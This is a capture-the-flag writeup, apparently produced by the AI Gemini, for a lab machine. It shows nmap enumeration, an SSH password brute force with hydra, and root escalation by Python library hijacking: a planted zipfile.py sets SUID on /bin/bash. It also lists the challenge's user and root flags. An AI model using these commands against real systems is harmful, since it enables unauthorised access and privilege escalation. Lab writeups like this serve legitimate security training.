# BSides Guatemala: Library Machine - Writeup
(*solved by gemini 🤖🤖🤖*)

**Target IP:** 10.48.181.133
**Goal:** Obtain user and root flags.

## 1. Enumeration

### Nmap Scan
The initial scan identified two open ports: SSH (22) and HTTP (80).

```bash
nmap -sC -sV -p- --min-rate 1000 10.48.181.133 -oN nmap_initial.txt
```

**Results:**
- **22/tcp:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- **80/tcp:** Apache httpd 2.4.18 (Ubuntu)

### Web Enumeration
Accessing the web server at `http://10.48.181.133/` revealed a blog titled "Welcome to Blog - Library Machine".

Checking `robots.txt`:
```bash
curl -s http://10.48.181.133/robots.txt
```
**Output:**
```
User-agent: rockyou 
Disallow: /
```
The `User-agent: rockyou` was a strong hint to use the `rockyou.txt` wordlist for brute-forcing.

Reviewing the blog page, I found several usernames mentioned in the comments section:
- `meliodas` (Post author)
- `root`
- `www-data`
- `Anonymous`

## 2. Exploitation

### SSH Brute-force
Using the username `meliodas` and the `rockyou.txt` wordlist, I performed an SSH brute-force attack.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.48.181.133 -t 4
```

**Result:**
- **Username:** `meliodas`
- **Password:** `iloveyou1`

### Initial Access
Logging in via SSH:
```bash
ssh meliodas@10.48.181.133
```
The user flag was found in the home directory:
```bash
cat /home/meliodas/user.txt
# Flag: 6d488cbb3f111d135722c33cb635f4ec
```

## 3. Privilege Escalation

### Sudo Privileges
Checking for sudo permissions:
```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
The user can run a specific Python script as root without a password.

### Analyzing bak.py
The contents of `/home/meliodas/bak.py`:
```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

### Python Library Hijacking
Since the script imports the `zipfile` module and we have write access to the directory where the script is executed, we can perform a Python Library Hijacking attack. 

I created a malicious `zipfile.py` in `/home/meliodas/` that executes a command to grant SUID permissions to `/bin/bash`:

```bash
echo 'import os; os.system("chmod u+s /bin/bash")' > /home/meliodas/zipfile.py
```

Now, when running the `bak.py` script with sudo, Python will first look for `zipfile.py` in the current directory before checking the standard library.

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

### Root Access
After running the script, `/bin/bash` now has SUID permissions. I executed it with `-p` to maintain root privileges:

```bash
/bin/bash -p
id
# uid=1000(meliodas) gid=1000(meliodas) euid=0(root) ...
```

The root flag was found in `/root/root.txt`:
```bash
cat /root/root.txt
# Flag: e8c8c6c256c35515d1d344ee0488c617
```

## 4. Final Flags
- **User Flag:** `6d488cbb3f111d135722c33cb635f4ec`
- **Root Flag:** `e8c8c6c256c35515d1d344ee0488c617`
